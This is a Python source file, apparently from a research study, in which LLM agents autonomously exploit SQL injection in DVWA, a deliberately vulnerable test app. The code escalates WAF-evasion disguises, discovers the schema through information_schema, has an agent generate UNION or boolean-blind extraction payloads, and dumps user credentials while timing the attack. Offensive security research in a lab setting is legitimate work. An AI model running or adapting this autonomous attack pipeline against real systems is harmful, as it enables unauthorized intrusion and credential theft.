"""Orchestrator: coordina a los tres agentes para explotar una SQL injection SIN conocer el esquema.

Flujo (como un pentester real, todo averiguado por comandos, nada hardcodeado):
  1. Login y fijar el nivel de seguridad.
  2. El Planner plantea la metodología (UNION-based sobre MySQL), sin asumir tablas ni columnas.
  3. El descubrimiento (determinista + evasión de WAF) averigua: contexto de comillas, nº de
     columnas, columnas reflejadas, tablas y columnas — vía ORDER BY e information_schema.
  4. El Analyst decide cuáles columnas descubiertas son usuario/contraseña.
  5. El Executor GENERA el payload de extracción desde ese esquema (con respaldo determinista).
  6. Se extraen las credenciales. Se mide el tiempo hasta la explotación (métrica del estudio)."""
from __future__ import annotations

import time
from typing import Callable, Optional

from . import knowledge
from .agents import Analyst, Executor, Planner
from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
from .dvwa import DVWAClient
from .evasion import EvasionEngine
from .llm import OllamaClient
from .recon import TechniqueSelector
from .types import RunResult

Logger = Optional[Callable[[str], None]]
_RECON_BUDGET = 60   # sondeos del reconocimiento (presupuesto propio, no gasta los pasos del ataque)


def _valid_dump(crafted: dict, table: str, cred_columns: tuple[str, str]) -> bool:
    """Valida el payload que generó el LLM; si no sirve, se usa el determinista."""
    p = str(crafted.get("payload", "")).strip().lower()
    if not p:
        return False
    u, pw = cred_columns[0].lower(), cred_columns[1].lower()
    return "union" in p and "select" in p and table.lower() in p and u in p and pw in p


class Orchestrator:
    def __init__(self, llm: OllamaClient, dvwa: DVWAClient) -> None:
        self.dvwa = dvwa
        self.llm = llm   # compartido por los 3 agentes; de aquí salen las métricas de costo del SLM
        self.planner = Planner("Planner", "planner.md", llm)
        self.executor = Executor("Executor", "executor.md", llm)
        self.analyst = Analyst("Analyst", "analyst.md", llm)

    def run(
        self,
        level: str,
        max_steps: int,
        timeout_seconds: int,
        log: Logger = None,
    ) -> RunResult:
        say = log or (lambda _msg: None)
        start = time.monotonic()
        deadline = start + timeout_seconds

        if not self.dvwa.login():
            raise RuntimeError("DVWA login failed — check the URL and credentials in config.py")
        self.dvwa.set_security(level)
        say(f"[Orchestrator] login ok, nivel de seguridad '{level}'")

        engine = EvasionEngine()            # motor del ATAQUE
        recon_engine = EvasionEngine()      # motor del RECONOCIMIENTO (aparte, no gasta pasos del ataque)
        counter = {"steps": 0}
        recon_counter = {"steps": 0}
        payload_log: list[dict] = []        # cada payload que se envía, con su estado (auditoría/export)

        def _probe(base_sql: str, eng: EvasionEngine, cnt: dict, budget: int) -> ProbeResult:
            # Envío consciente del WAF: escala disfraces hasta que uno pasa (o se agota la escalera).
            while True:
                if cnt["steps"] >= budget or time.monotonic() > deadline:
                    return ProbeResult(blocked=True)
                payload, pipeline = eng.next_payload(base_sql)
                if payload is None:
                    return ProbeResult(blocked=True)
                cnt["steps"] += 1
                resp = self.dvwa.run_sqli(payload, level)
                payload_log.append({"payload": payload, "phase": "ataque",
                                    "blocked": resp.blocked, "http_status": resp.http_status})
                if resp.blocked:
                    say(f"[WAF] bloqueó (HTTP {resp.http_status}) — escalando evasión")
                    eng.record(pipeline, payload, blocked=True)
                    continue
                eng.record(pipeline, payload, blocked=False)
                cells = [[r.get("first_name", ""), r.get("surname", "")] for r in resp.rows]
                return ProbeResult(cells=cells, db_error=resp.db_error, blocked=False)

        def probe(base_sql: str) -> ProbeResult:
            return _probe(base_sql, engine, counter, max_steps)

        def recon_probe(base_sql: str) -> ProbeResult:
            return _probe(base_sql, recon_engine, recon_counter, _RECON_BUDGET)

        def time_probe(base_sql: str) -> float:
            t0 = time.monotonic()
            _probe(base_sql, recon_engine, recon_counter, _RECON_BUDGET)
            return time.monotonic() - t0

        # El Planner plantea la metodología (no asume esquema).
        strategy = str(self.planner.plan(level).get("strategy", ""))
        say(f"[Planner] {strategy}")

        # RECONOCIMIENTO: elige la técnica por observación (OWASP WSTG), ANTES de atacar — nunca
        # por el nombre del WAF. Así no prueba una técnica tras otra: escoge la correcta de entrada.
        recon = TechniqueSelector(recon_probe, time_probe, say=say).select()

        # El Analyst elige las columnas de credenciales; si falla, respaldo determinista.
        def pick(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
            picked = self.analyst.pick_credentials(table, columns)
            if picked and picked[0] in columns and picked[1] in columns:
                say(f"[Analyst] credenciales en {table!r}: {picked}")
                return picked
            return pick_credential_columns(table, columns)

        discovery = SchemaDiscovery(probe, say=say, pick=pick)
        extracted: list[dict[str, str]] = []
        success = False
        trace: list[str] = [f"recon: señales={recon.signals} -> técnica elegida={recon.technique}"]

        if recon.technique == "union":
            # Técnica elegida: UNION. Se descubre el esquema y se extrae por UNION.
            res = discovery.discover()
            trace = res.trace
            if res.cred_columns[0]:
                crafted = self.executor.craft_dump(
                    res.quote, res.columns, res.reflected, res.target_table, res.cred_columns
                )
                template = discovery.build_dump_payload(res)
                payload = str(crafted.get("payload", "")).strip() if _valid_dump(
                    crafted, res.target_table, res.cred_columns
                ) else template
                say(f"[Executor] payload de extracción: {payload!r}")
                extracted = discovery.extract(payload, res)
                success = bool(extracted)
                if success:
                    conf = "verificada" if res.verified else "sin verificar"
                    say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas "
                        f"(DBMS={res.dbms or '?'}, confirmada por {res.techniques}, extracción {conf})")
            # Respaldo INFORMADO (no prueba a ciegas): solo si el reconocimiento ya vio que el
            # booleano es viable.
            if not success and recon.signals.get("boolean"):
                blind = self._run_blind(engine, level, deadline, counter, say, payload_log)
                if blind:
                    extracted, success = [blind], True
                    trace.append(f"extracción boolean-blind (LIKE): {blind}")
        elif recon.technique == "boolean":
            # Técnica elegida: boolean-blind. UNION no pasa el WAF -> se va directo a la ciega.
            say("[Recon] UNION no pasa el WAF; el booleano sí → extracción ciega directa "
                "(sin intentar UNION)")
            blind = self._run_blind(engine, level, deadline, counter, say, payload_log)
            if blind:
                extracted, success = [blind], True
                trace.append(f"extracción boolean-blind (LIKE): {blind}")
        else:
            say(f"[Recon] ninguna técnica atacable (señales={recon.signals})")

        if not success:
            say("[Orchestrator] FAILED — no se extrajeron credenciales")

        elapsed = time.monotonic() - start
        return RunResult(
            level=level,
            success=success,
            elapsed_seconds=round(elapsed, 2),
            steps_used=counter["steps"] + recon_counter["steps"],
            extracted=extracted,
            strategy=strategy,
            trace=trace,
            waf_profile=engine.profile.summary(),
            payloads=payload_log,
            slm_metrics=self.llm.metrics() if hasattr(self.llm, "metrics") else {},
        )

    def _blind_oracle(self, engine, level, deadline, counter, payload_log):
        """Oráculo sí/no para la extracción ciega: envía por el motor de evasión y devuelve True si
        la condición inyectada fue verdadera (el objetivo devolvió fila)."""
        def oracle(payload: str) -> bool:
            while time.monotonic() < deadline:
                p, pipe = engine.next_payload(payload)
                if p is None:
                    return False
                counter["steps"] += 1
                resp = self.dvwa.run_sqli(p, level)
                payload_log.append({"payload": p, "phase": "blind",
                                    "blocked": resp.blocked, "http_status": resp.http_status})
                if resp.blocked:
                    engine.record(pipe, p, blocked=True)
                    continue
                engine.record(pipe, p, blocked=False)
                return bool(resp.rows)
            return False
        return oracle

    def _run_blind(self, engine, level, deadline, counter, say, payload_log):
        """Extracción boolean-blind: el orquestador arma el oráculo y los candidatos de columna; el
        EXECUTOR genera la forma del ataque y maneja el BlindExtractor (herramienta) para extraer."""
        oracle = self._blind_oracle(engine, level, deadline, counter, payload_log)
        user_cands, pass_cands = self._credential_candidates(say)
        like = self.executor.craft_blind(say)   # 1 llamada: el Executor GENERA la forma del ataque
        for quote in ("", "'"):   # medium = entero (sin comilla); otros = cadena
            row = self.executor.extract_blind(oracle, quote, user_cands, pass_cands, like, say)
            if row:
                return row
        return None

    def _credential_candidates(self, say: Logger) -> tuple[list[str], list[str]]:
        """Nombres de columnas de credencial para la ruta ciega: el Analyst (LLM) los PROPONE y se
        ATERRIZAN en la wordlist de sqlmap (solo nombres reales van primero). Respaldo determinista
        si el LLM no responde."""
        try:
            users, passwords = self.analyst.guess_credential_columns()
        except Exception:
            users, passwords = [], []
        wl = {c.lower() for c in knowledge.common_columns()}
        def ground(names: list[str]) -> list[str]:
            inwl = [n for n in names if n.lower() in wl]      # nombres del LLM que existen en sqlmap
            extra = [n for n in names if n.lower() not in wl]  # el resto de lo propuesto por el LLM
            return inwl + extra
        users, passwords = ground(users), ground(passwords)
        if users and passwords:
            say(f"[Blind] columnas propuestas por el Analyst (LLM), aterrizadas en sqlmap: "
                f"usuario≈{users[:4]} password≈{passwords[:4]}")
            return users, passwords
        # Respaldo determinista: wordlist de sqlmap (o lista mínima si falta el dataset).
        fu, fp = knowledge.credential_column_candidates()
        say("[Blind] Analyst sin respuesta → respaldo determinista (wordlist de sqlmap)")
        return (users or fu), (passwords or fp)
